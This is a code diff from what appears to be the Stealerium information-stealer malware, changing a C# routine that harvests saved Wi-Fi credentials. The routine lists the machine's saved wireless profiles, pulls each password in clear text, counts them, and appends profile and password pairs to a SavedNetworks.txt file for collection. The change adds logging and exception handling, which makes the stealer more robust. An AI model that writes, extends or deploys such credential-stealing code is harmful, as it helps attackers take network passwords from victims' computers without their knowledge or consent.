@@ -37,18 +37,24 @@ namespace Stealerium.Target.System
         // Save wifi networks with passwords to file
         public static void SavedNetworks(string sSavePath)
         {
-            var profiles = GetProfiles();
-            foreach (var profile in profiles)
+            try
             {
-                // Skip
-                if (profile.Equals("65001"))
-                    continue;
+                Logging.Log("Fetching Wifi Passwords Started!");
+                var profiles = GetProfiles();
+                foreach (var profile in profiles)
+                {
+                    // Skip
+                    if (profile.Equals("65001"))
+                        continue;
 
-                Counter.SavedWifiNetworks++;
-                var pwd = GetPassword(profile);
-                var fmt = $"PROFILE: {profile}\nPASSWORD: {pwd}\n\n";
-                File.AppendAllText(sSavePath + "\\SavedNetworks.txt", fmt);
+                    Counter.SavedWifiNetworks++;
+                    var pwd = GetPassword(profile);
+                    var fmt = $"PROFILE: {profile}\nPASSWORD: {pwd}\n\n";
+                    File.AppendAllText(sSavePath + "\\SavedNetworks.txt", fmt);
+                }
+                Logging.Log("Fetching Wifi Passwords Ended!");
             }
+            catch(Exception ex) { Logging.LogEx(ex); }
         }
     }
 }
